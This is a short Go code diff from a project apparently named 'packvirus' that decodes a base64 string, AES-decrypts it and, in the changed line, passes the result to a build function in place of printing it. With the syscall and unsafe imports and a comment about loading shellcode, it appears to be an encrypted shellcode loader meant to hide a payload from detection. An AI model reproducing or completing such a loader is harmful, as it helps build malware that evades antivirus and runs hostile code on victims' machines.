@@ -1,8 +1,8 @@
+// A package to test haw to load shellcode
 package main
 
 import (
 	"encoding/base64"
-	"fmt"
 	"packvirus/encrypt"
 	"syscall"
 	"unsafe"
@@ -27,5 +27,5 @@ func main() {
 	baseByte, _ := base64.StdEncoding.DecodeString(str)
 	decryptAES, _ := encrypt.DecryptFunctions["aes"](baseByte, key)
 	// you need to add signature
-	fmt.Println(string(decryptAES))
+	build(string(decryptAES))
 }
